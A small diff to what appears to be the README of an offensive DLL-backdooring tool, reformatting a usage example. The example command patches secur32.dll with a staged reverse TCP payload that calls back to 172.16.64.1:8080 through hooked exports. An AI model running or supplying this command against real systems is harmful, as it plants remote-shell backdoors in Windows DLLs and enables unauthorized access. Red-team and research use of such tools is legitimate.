@@ -106,8 +106,10 @@ Before the upgrade, many DLLs can be hijacked and OneDrive is enabled by default
 
 ```bash
 
-./backdoor.py -f tests/secur32.dll PATCH_METHOD=hook_dll_exports MODE=dll_loader_single_cave \
-PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded HOST=172.16.64.1 PORT=8080 EXPORTS=GetUserNameExW -Z 
+./backdoor.py -f tests/secur32.dll PATCH_METHOD=hook_dll_exports \
+MODE=dll_loader_single_cave \
+PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded \
+HOST=172.16.64.1 PORT=8080 EXPORTS=GetUserNameExW -Z 
 ^(;,;)^ - nice to see you
          Author:    Joshua Pitts
          Email:     the.midnite.runr[-at ]gmail<d o-t>com
